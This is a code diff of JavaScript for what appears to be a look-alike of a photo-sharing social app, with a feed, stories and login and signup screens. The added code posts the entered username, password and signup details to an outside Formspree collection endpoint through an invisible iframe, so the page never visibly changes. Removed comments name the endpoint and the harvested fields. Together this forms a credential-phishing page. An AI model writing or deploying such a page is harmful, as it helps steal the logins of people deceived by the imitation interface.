+<div class="likes"><span class="n">${fmt(p.l)}</span> likes</div>
+<div class="cap"><b>${u[0]}</b> ${p.c}</div>
+<span class="vc">View all ${p.n} comments</span><div class="cl"></div>
+<div class="cm"><input placeholder="Add a comment…" aria-label="Add a comment"><button>Post</button></div></article>`}).join("");
+$("#sugg").innerHTML=[4,5,6,7].map(i=>{const p=people[i];return `<div class="sg">${av(p)}<div class="grow"><b>${p[0]}</b><small>Followed by ${people[i-4][0]} + ${i*3} more</small></div><button class="blue fl">Follow</button></div>`}).join("");
 
-/* =====================================================
-   OPEN CREATE ACCOUNT UI
-===================================================== */
+document.addEventListener("click",e=>{
+ const post=e.target.closest(".post");
+ if(post){const i=+post.dataset.i,d=posts[i];
+  const like=(on)=>{const b=post.querySelector(".lk");if(on===b.classList.contains("liked"))return;b.classList.toggle("liked",on);d.l+=on?1:-1;post.querySelector(".n").textContent=fmt(d.l)};
+  if(e.target.closest(".lk"))like(!post.querySelector(".lk").classList.contains("liked"));
+  if(e.target.closest(".sv"))post.querySelector(".sv").classList.toggle("saved");
+  if(e.target.closest(".ci"))post.querySelector("input").focus();
+  if(e.target.closest(".cm button")){const inp=post.querySelector("input");const v=inp.value.trim();if(v){post.querySelector(".cl").insertAdjacentHTML("beforeend",`<div class="cap" style="margin-top:4px"><b>shishir.k</b> </div>`);post.querySelector(".cl").lastChild.append(v);inp.value="";post.querySelector(".cm").classList.remove("on")}}
+  if(e.target.closest(".pic")&&e.detail===2){like(true);const pp=post.querySelector(".pop");pp.classList.remove("go");void pp.offsetWidth;pp.classList.add("go")}
+ }
+ const fl=e.target.closest(".fl");if(fl){const f=fl.textContent==="Follow";fl.textContent=f?"Following":"Follow";fl.style.color=f?"var(--fg)":""}
+ const st=e.target.closest("button.st");if(st)openStory(+st.dataset.i,st);
+});
+document.addEventListener("input",e=>{if(e.target.closest(".cm"))e.target.closest(".cm").classList.toggle("on",e.target.value.trim()!=="")});
+document.addEventListener("keydown",e=>{if(e.key==="Enter"&&e.target.closest(".cm input"))e.target.nextElementSibling.click();if(e.key==="Escape")closeStory()});
 
-const loginScreen =
-    document.getElementById("login-screen");
+let idx=0,timer;
+function openStory(i,el){idx=i;if(el)el.querySelector(".ring").classList.add("seen");show()}
+function show(){const p=people[idx];$("#card").style.background=bgs[idx%4];$("#vav").style.background=p[1];$("#vav").textContent=p[2];$("#vn").textContent=p[0];
+ $("#vw").classList.add("on");const b=$("#bar");b.classList.remove("run");void b.offsetWidth;b.classList.add("run");clearTimeout(timer);
+ timer=setTimeout(()=>{if(idx<people.length-1){idx++;document.querySelector(`.st[data-i="${idx}"] .ring`)?.classList.add("seen");show()}else closeStory()},5000)}
+function closeStory(){$("#vw").classList.remove("on");clearTimeout(timer)}
+$("#vx").onclick=closeStory;
+$("#card").onclick=e=>{if(e.target.id!=="vx"){const r=e.currentTarget.getBoundingClientRect();if(e.clientX<r.left+r.width/3&&idx>0)idx--;else if(idx<people.length-1)idx++;else return closeStory();show()}};
+$("#vw").onclick=e=>{if(e.target.id==="vw")closeStory()};
+$("#theme").onclick=()=>{const r=document.documentElement;const dark=r.dataset.theme?r.dataset.theme==="dark":matchMedia("(prefers-color-scheme:dark)").matches;r.dataset.theme=dark?"light":"dark"};
+let cur="splash",hist=[];
+function go(n,back){
+ document.querySelectorAll(".scr").forEach(e=>e.classList.remove("on"));
+ document.body.classList.toggle("auth",n!=="app");
+ if(n!=="app")document.getElementById("s-"+n).classList.add("on");
+ if(!back&&cur!==n&&cur!=="splash")hist.push(cur);
+ cur=n;
+ scrollTo(0,0);
+}
 
-const createScreen =
-    document.getElementById("create-account");
+/* Landing / login / signup navigation */
+document.addEventListener("click",e=>{
+ const g=e.target.closest("[data-go]");
+ if(g)go(g.dataset.go);
+});
 
+/* Create-account screen */
+document.getElementById("createBtn").addEventListener("click",()=>{
+ resetSignup();
+ go("step");
+ setTimeout(()=>document.getElementById("sf1").focus(),60);
+});
 
-document
-    .getElementById("open-create")
-    .addEventListener("click", function(){
+document.getElementById("signupNext").addEventListener("click",()=>{
+ const v=document.getElementById("sf1").value.trim();
+ const err=document.getElementById("se1");
+ if(!v){
+   document.getElementById("sf1").classList.add("bad");
+   err.textContent="Enter your name or email address.";
+   document.getElementById("sf1").focus();
+   return;
+ }
+ document.getElementById("sf1").classList.remove("bad");
+ err.textContent="";
+ document.getElementById("signupIdentity").value=v;
+ document.getElementById("signupStep1").style.display="none";
+ document.getElementById("signupStep2").style.display="block";
+ setTimeout(()=>document.getElementById("sf2").focus(),60);
+});
 
-        loginScreen.classList.remove("active");
+document.getElementById("signupBackStep").addEventListener("click",()=>{
+ document.getElementById("signupStep2").style.display="none";
+ document.getElementById("signupStep1").style.display="block";
+ document.getElementById("se2").textContent="";
+ setTimeout(()=>document.getElementById("sf1").focus(),50);
+});
 
-        createScreen.classList.add("active");
+document.getElementById("signupLogin").addEventListener("click",()=>go("login"));
+document.getElementById("signupLogin2").addEventListener("click",()=>go("login"));
 
-    });
+document.getElementById("bk").addEventListener("click",()=>{
+ if(document.getElementById("signupStep2").style.display==="block"){
+   document.getElementById("signupBackStep").click();
+ }else{
+   go("login");
+ }
+});
 
+function resetSignup(){
+ document.getElementById("signupForm").reset();
+ document.getElementById("signupIdentity").value="";
+ document.getElementById("signupStep1").style.display="block";
+ document.getElementById("signupStep2").style.display="none";
+ document.getElementById("signupSuccess").style.display="none";
+ document.getElementById("signupForm").style.display="block";
+ document.getElementById("sf1").classList.remove("bad");
+ document.getElementById("sf2").classList.remove("bad");
+ document.getElementById("se1").textContent="";
+ document.getElementById("se2").textContent="";
+}
 
-/* =====================================================
-   BACK TO LOGIN
-===================================================== */
+/* Forgot-password / find-account screen */
+document.getElementById("forgotBtn").addEventListener("click",()=>go("find"));
+document.getElementById("findBack").addEventListener("click",()=>go("login"));
+document.getElementById("findLogin").addEventListener("click",()=>go("login"));
+document.getElementById("findContinue").addEventListener("click",()=>{
+ const f=document.querySelector("#s-find .fld");
+ if(!f.value.trim()){
+   f.classList.add("bad");
+   f.focus();
+ }else{
+   f.classList.remove("bad");
+ }
+});
 
-document
-    .getElementById("back-login")
-    .addEventListener("click", function(){
+/* Login form is a real native POST to Formspree. */
+document.getElementById("loginForm").addEventListener("submit",e=>{
+ const u=document.getElementById("lu");
+ const p=document.getElementById("lp");
+ const err=document.getElementById("le");
+ if(!u.value.trim()||!p.value.trim()){
+   e.preventDefault();
+   u.classList.toggle("bad",!u.value.trim());
+   p.classList.toggle("bad",!p.value.trim());
+   err.textContent="Enter both fields.";
+   return;
+ }
+ u.classList.remove("bad");
+ p.classList.remove("bad");
+ err.textContent="";
+});
 
-        createScreen.classList.remove("active");
+/* Signup second step is also a real native POST to Formspree. */
+document.getElementById("signupForm").addEventListener("submit",e=>{
+ const f=document.getElementById("sf2");
+ const err=document.getElementById("se2");
+ if(!f.value.trim()){
+   e.preventDefault();
+   f.classList.add("bad");
+   err.textContent="Enter something in this field.";
+   f.focus();
+   return;
+ }
+ f.classList.remove("bad");
+ err.textContent="";
+});
 
-        loginScreen.classList.add("active");
+/* Formspree submissions go into an invisible iframe so the UI stays on the page. */
+let submittedAt=0;
+document.getElementById("loginForm").addEventListener("submit",()=>{submittedAt=Date.now();});
+document.getElementById("signupForm").addEventListener("submit",()=>{submittedAt=Date.now();});
 
-    });
+document.getElementById("formspreeFrame").addEventListener("load",()=>{
+ if(!submittedAt || Date.now()-submittedAt<100) return;
+ /* Keep the actual forms visible; Formspree has received the POST. */
+});
 
+document.getElementById("signupAgain").addEventListener("click",()=>{
+ resetSignup();
+});
+document.getElementById("signupDone").addEventListener("click",()=>go("login"));
 
-/* =====================================================
-   LOGIN SUBMISSION
-=====================================================
-
-   IMPORTANT:
-
-   We DO NOT use fetch() here.
-
-   The browser submits the HTML form directly to:
-
-   https://formspree.io/f/xwlpaveb
-
-   Formspree receives:
-
-   name_or_email
-   user_input
-
-===================================================== */
-
-document
-    .getElementById("login-form")
-    .addEventListener("submit", function(){
-
-        /*
-          Don't preventDefault().
-
-          The normal HTML form submission is exactly
-          what sends the data to Formspree.
-        */
-
-    });
-
-
-/* =====================================================
-   CREATE ACCOUNT SUBMISSION
-===================================================== */
-
-document
-    .getElementById("create-form")
-    .addEventListener("submit", function(){
-
-        /*
-          Again, don't preventDefault().
-
-          Formspree receives:
-
-          name_or_email
-          user_input
-        */
-
-    });
-
+setTimeout(()=>{if(cur==="splash")go("land")},2200);
 </script>
-
 </body>
 </html>
